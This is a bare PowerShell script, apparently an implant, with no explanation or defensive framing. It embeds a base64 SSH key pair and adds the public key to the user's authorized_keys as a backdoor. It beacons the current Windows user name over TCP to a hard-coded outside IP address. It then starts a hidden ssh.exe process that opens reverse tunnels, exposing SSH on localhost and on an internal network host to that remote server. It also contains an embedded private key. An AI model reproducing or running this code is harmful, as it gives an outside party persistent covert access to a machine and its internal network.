$Base64PrivateKey = 'LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUNGd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFnRUF2N0RCd0lIWHNtU3hvL1lwUTRTZ293UFBUMXRGT3dXeEJ2Y0FVTXlXMHVJcU9DemNpZWYyCjZRaEZGM2xNcjdtM05PZlRYMFhrMXVrT0QvcGJna3Rsa0pRQnlFWnVZWVlyVDFuTGg4aVRJTHl0eHUrQitkbmJsek92UDAKM1owTVczMzk3ZzE4dmdpRlpjbE8xR3lReHNTd3VvRDB0ZjRGQWlPZUlGQ1dZN29OYzZYYWsvcUltT0xINDBzWWVxUkdVYQpzdFk0bWNvcWIwMkNIVVord2lWR1dHNUtEajNmMmF5UVRWSHlhSW9sbkNVMldnT1FDZWN5alhvQm9KQnR2ODllMEVtM1ZsCmM1RGY4bUZJaFpPQTFnazZaZGZiYUk5OVJsZCtxSlRiT0ZMa2szT3dWMzNLWjR4MXBVeE42cGowa1BDOXh3a3FML2syd3gKb0ZORitkeStPL0QreHNwTlRWYjJpaHVhQUo3YjJUQ2c1b1BQakU2WkhZYjhZLzM5MUppNzZ0UnVTK29tVCtIMjhvMTdtcgpYVHdPV0VheXJpT3RjbUtkQlBIZjdaanQzQlpvVHNob2UwYm95U3lTTWpieDVqUnhOWWhhVFZBbkhnTHJrd2ZFcmkzaytiClZRRWFFVGF5S0d3dCtQMUNOS0Q0b0xldlU5QzZnVERXQXpmY3M2Y2hEbGVycnRnUzhheGRKQ1VKTzJsWnFEbmJnVm5EY1UKSEcwSDEwOTRUcko0bDVsaVJNUjJiMXJvUFRWQ1V0bUF6Y0VhRWRQb0Z0UW4zWnM0UHlSK0dpbTdkMlZsWFpZaTZoUmp1eApjUXN5QWFxbnVIUVlFS3g5b0xwVmg5RzUvdXp2NnY5U24rbGN6ZG1jZTFQNVFwaUo1RHJmRnBLYUVHeFFlaFA3dVNUQld6CkVBQUFkUTByRUIwZEt4QWRFQUFBQUhjM05vTFhKellRQUFBZ0VBdjdEQndJSFhzbVN4by9ZcFE0U2dvd1BQVDF0Rk93V3gKQnZjQVVNeVcwdUlxT0N6Y2llZjI2UWhGRjNsTXI3bTNOT2ZUWDBYazF1a09EL3BiZ2t0bGtKUUJ5RVp1WVlZclQxbkxoOAppVElMeXR4dStCK2RuYmx6T3ZQMDNaME1XMzM5N2cxOHZnaUZaY2xPMUd5UXhzU3d1b0QwdGY0RkFpT2VJRkNXWTdvTmM2Clhhay9xSW1PTEg0MHNZZXFSR1Vhc3RZNG1jb3FiMDJDSFVaK3dpVkdXRzVLRGozZjJheVFUVkh5YUlvbG5DVTJXZ09RQ2UKY3lqWG9Cb0pCdHY4OWUwRW0zVmxjNURmOG1GSWhaT0ExZ2s2WmRmYmFJOTlSbGQrcUpUYk9GTGtrM093VjMzS1o0eDFwVQp4TjZwajBrUEM5eHdrcUwvazJ3eG9GTkYrZHkrTy9EK3hzcE5UVmIyaWh1YUFKN2IyVENnNW9QUGpFNlpIWWI4WS8zOTFKCmk3NnRSdVMrb21UK0gyOG8xN21yWFR3T1dFYXlyaU90Y21LZEJQSGY3Wmp0M0Jab1RzaG9lMGJveVN5U01qYng1alJ4TlkKaGFUVkFuSGdMcmt3ZkVyaTNrK2JWUUVhRVRheUtHd3QrUDFDTktENG9MZXZVOUM2Z1REV0F6ZmNzNmNoRGxlcnJ0Z1M4YQp4ZEpDVUpPMmxacURuYmdWbkRjVUhHMEgxMDk0VHJKNGw1bGlSTVIyYjFyb1BUVkNVdG1BemNFYUVkUG9GdFFuM1pzNFB5ClIrR2ltN2QyVmxYWllpNmhSanV4Y1FzeUFhcW51SFFZRUt4OW9McFZoOUc1L3V6djZ2OVNuK2xjemRtY2UxUDVRcGlKNUQKcmZGcEthRUd4UWVoUDd1U1RCV3pFQUFBQURBUUFCQUFBQ0FFMWt0QlZoVnhEempyVkFRZEM4ejQ2QmowWGU5OGlvdDV5MApSVEJhS2RyaTdXRFkzQUhoNGRLY1FDa0dGR3d1YzBXdEE2NUhyZWtIRjJKa0ZtWTR3cnpveFA5elVFV1h3Z3k3bUcwdUVoCmo1bEwvcEczVWcvSVBEbmxIVXdNaUZ5NE5iblRRRFlKZ3JKaDRLM3JWMWlwT1NGVHgzbGpJZXFITHVTbEpOTUczejkrQ3cKNEw3UEt0UFQ4THBzcDlZTmJBWWdiNkhIK2ZJT1BTWk12QWp1dThRZ1kwMzB0VmhSVDhHb0FGTXMwNXFEZTdwRURmZXhuTAp0Nk13WDh5aExUU3RpVnFxdjFjMWV2V0ZTWjZFdTFPdlRpQ29VakdaSFY4MUhESThSM1lxSVpkVzhpK2czZ09JdGtjUzA3CktRSnM0T0pORWpaaUVRWVlmTURhWGpwUFlZNW1wUW5NMkVpZG9kVnZkODk3TEw1WXBPdVl5c0NXUENjUXBWVjhWRlNTa1AKYkdHdGpmUlhHMW5HQWxRUDZGRFFJZi8rajU5S2NESkdEL1B2eEY4VXB5Wmh5N1UyY0pkQzRTUUY3YkVxQytNbkVUYWRPUQpzdTlDNDRLNUR6UlI1akhCK252VGxZRG1hQTBRbzBTQXA2ZzBjV20wOFJ6N0lHbTRsRGgvbkx6ZGFpVVhIQUpUb1I0dWJpCjhSTWlpa1JHSGtFMi9PMHE0MGRjMjZ6NEU2OWxobG9jR1JnZGlKU0ZYTDdlL1hTUCtsOGdURXJtZzQ0QlRwdmtQY3QrZE8KZDM4SGpudG02bDZMZUtkRXhxaC9odEpKL0dRczF5Y0Z6ZDczdzBhczRnVjJHcm10VkRZYUxuL0xUd05pMm5uZm11azZvQgplazFrV3VxZlV3ZklKWGpRWkJBQUFCQVFDcCt5MUVmVHFSWHB5S0s3cnlZRmhyNUVCN1ZXQkUvZWRKWGJzMlFlcUhFa0JzCnhMdDZqcWtKc2M1UjZnOEtIQm04bmVjQi9jNHRGWkVldVFORFNVZmZSUFRxQU5iODBqTDI5MEhyaGtJZW9aczIzQWlKTzcKNzBteGhhUkJ6bHR2SkVCdStYbWI2emZLUjZpZ1NYNVFGdE90QVFUWjFHU2pUZUNadmFDeG1wMjFvY3hBRnk0VnljOVg3WAoxblVDWnA3c28vNVJ4cXhYMXNlUTIzZi81WEdnL0tHVzR0NE5QOUptUHh6MktKYU9OZTNHL1J0Mk0rOXVETFVva0YvV1laCk1pTUw5K24xYWl1Z1lpNGMxVzY4TmhBVXlrQmJ4Q1ZpaHcyY1FKTEZKOUM2N05aR05IcStjLzYwS1M1dHZiSFJRRkNGNWUKeGN4SXVjYnRXakZ6K1NCNkFBQUJBUUR0VCsyTlRJTVFhTHRkZ1pUeUc5TmMzQVY0VXZpbXNtSVpsRy9GWDFHTGMrMURLNwovaEUvWk1WK3l4dVpwOVkycWFOVVhZcXo2a1RGM1BsY1FGY25QUkd0YWt1ektFNnJhKzBIcm5UWHJzcmpHRnpHaktacTZRCmhLalBEUUpJMUhzSXlORC9sMlU5RzVwRzBCRExnekRPajNDSWI3azhuakMrSDkwcVVjbW9Gc2tqRzhQU2JnNFIzbDg5NjEKNGJNeDRDZmhKTENrNkdZSjRmQmFCbklGaXR4ekVnblVWWFZwNHZXNUY3eUtXc1R5bzJiNC96SENub2NSVG9oL1Z6SVphcgozdlVZSHNhS2xUcDZRWDRWT1NPdHhHMnYzbk8zb2NPY1o5dEJBR29uQUxMdStiNlUxVTBKcmFSTVpsWjZ2azFNNGxLT0x2ClBpdk10UHd4WFVTbUE5QUFBQkFRRE95UjhjdFFwT01Wek1JYVF2djBYU3p3UWhEdmNhNlFxamJXUGF0ekdaWmhZSTU0amgKVjloenN5c21Qb0F1YTR2WVdjZGczY1cvOU9LdlFzZVFQV3dOSmZoM3ZZUGYyWGt6MDJaM0hCUjJRTGgyTHVUOEhVcFhyTgpEbzE4UWxleU5OMHg0TTRCYTEwTG55bHR5OWFhSnpzazl1YXd1VWUrNzkrVWhYdCtyZGt3TDZSUHNwMVhxSm5sVnorUGMxCjlBUUFJSmxCM0VQbit6OW5vakVNN0ZRUVJPdVV4bnFvamhWYnZ2aHhXVVVNNTF1dkViWmhXRE1UVHJhNkcwdm9PaEY2SkgKTitkTzhaUnVIS2cxMDFyY1dQZFEzRGRTS0tFNzBzZFRkaFkxK3MrS0FNenFaS0p1T1lmTTNOQ3FjaUMyKzJOVDdoYWtZLwpNdmtWM0pVSWtRSUZBQUFBR0dWb2NtOWphM05jYTNOcFFFVklMVmRwYmxObGNuWXdNUUVDCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo='
$Base64PublicKey   = "c3NoLXJzYSBBQUFBQjNOemFDMXljMkVBQUFBREFRQUJBQUFDQVFDL3NNSEFnZGV5WkxHajlpbERoS0NqQTg5UFcwVTdCYkVHOXdCUXpKYlM0aW80TE55SjUvYnBDRVVYZVV5dnViYzA1OU5mUmVUVzZRNFArbHVDUzJXUWxBSElSbTVoaGl0UFdjdUh5Sk1ndkszRzc0SDUyZHVYTTY4L1RkblF4YmZmM3VEWHkrQ0lWbHlVN1ViSkRHeExDNmdQUzEvZ1VDSTU0Z1VKWmp1ZzF6cGRxVCtvaVk0c2ZqU3hoNnBFWlJxeTFqaVp5aXB2VFlJZFJuN0NKVVpZYmtvT1BkL1pySkJOVWZKb2lpV2NKVFphQTVBSjV6S05lZ0dna0cyL3oxN1FTYmRXVnprTi95WVVpRms0RFdDVHBsMTl0b2ozMUdWMzZvbE5zNFV1U1RjN0JYZmNwbmpIV2xURTNxbVBTUThMM0hDU292K1RiREdnVTBYNTNMNDc4UDdHeWsxTlZ2YUtHNW9BbnR2Wk1LRG1nOCtNVHBrZGh2eGovZjNVbUx2cTFHNUw2aVpQNGZieWpYdWF0ZFBBNVlSckt1STYxeVlwMEU4ZC90bU8zY0ZtaE95R2g3UnVqSkxKSXlOdkhtTkhFMWlGcE5VQ2NlQXV1VEI4U3VMZVQ1dFZBUm9STnJJb2JDMzQvVUkwb1BpZ3Q2OVQwTHFCTU5ZRE45eXpweUVPVjZ1dTJCTHhyRjBrSlFrN2FWbW9PZHVCV2NOeFFjYlFmWFQzaE9zbmlYbVdKRXhIWnZXdWc5TlVKUzJZRE53Um9SMCtnVzFDZmRtemcvSkg0YUtidDNaV1ZkbGlMcUZHTzdGeEN6SUJxcWU0ZEJnUXJIMmd1bFdIMGJuKzdPL3EvMUtmNlZ6TjJaeDdVL2xDbUlua090OFdrcG9RYkZCNkUvdTVKTUZiTVE9PSBlaHJvY2tzXGtzaUBFSC1XaW5TZXJ2MDENCg=="
$KeyFileName      = 'windows_server'
$RemoteUser       = 'eh'
$RemoteHost       = '135.235.193.119'


$tunnels = @(
    @{ RemotePort = 2222; Local = '10.10.1.6:22' },
    @{ RemotePort = 2223; Local = 'localhost:22' }
)

$sshDir = Join-Path $env:USERPROFILE '.ssh'
if (-not (Test-Path $sshDir)) {
    New-Item -ItemType Directory -Path $sshDir -Force | Out-Null
}
try {
    [byte[]]$raw = [Convert]::FromBase64String($Base64PrivateKey)
} catch {
    throw "Invalid Base64 key: $($_.Exception.Message)"
}

$KeyPath = Join-Path $sshDir $KeyFileName
[IO.File]::WriteAllBytes($KeyPath, $raw)

try {
    [byte[]]$rawPub = [Convert]::FromBase64String($Base64PublicKey)
} catch {
    throw "Invalid Base64 public key: $($_.Exception.Message)"
}
$AuthKeysPath = Join-Path $sshDir 'authorized_keys'
if (-not (Test-Path $AuthKeysPath)) {
    New-Item -ItemType File -Path $AuthKeysPath -Force | Out-Null
}
Add-Content -Path $AuthKeysPath -Value ([System.Text.Encoding]::UTF8.GetString($rawPub))

icacls $KeyPath /inheritance:r /grant:r "SYSTEM:F" | Out-Null
icacls $KeyPath /grant:r "Administrators:F" | Out-Null
icacls $KeyPath /grant:r "$($env:USERNAME):F" | Out-Null


$Who = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
$client = [System.Net.Sockets.TcpClient]::new($RemoteHost, 36452)
try {
    $stream = $client.GetStream()
    $data   = [Text.Encoding]::ASCII.GetBytes($Who + "`r`n")
    $stream.Write($data, 0, $data.Length)
    $stream.Flush()
}
finally {
    if ($stream) { $stream.Dispose() }
    $client.Close()
}

$RArgs = foreach ($t in $tunnels) {
    "-R", "$($t.RemotePort):$($t.Local)"
}

$sshArgs = @(
    "-i", $KeyPath,
    "-o", "ServerAliveInterval=60",
    "-o", "ServerAliveCountMax=3",
    "-N"
) + $RArgs + @("$RemoteUser@$RemoteHost")

Write-Host "Running: ssh $($sshArgs -join ' ')"
Start-Process -FilePath "ssh.exe" -ArgumentList $sshArgs -WindowStyle Hidden | Out-Null
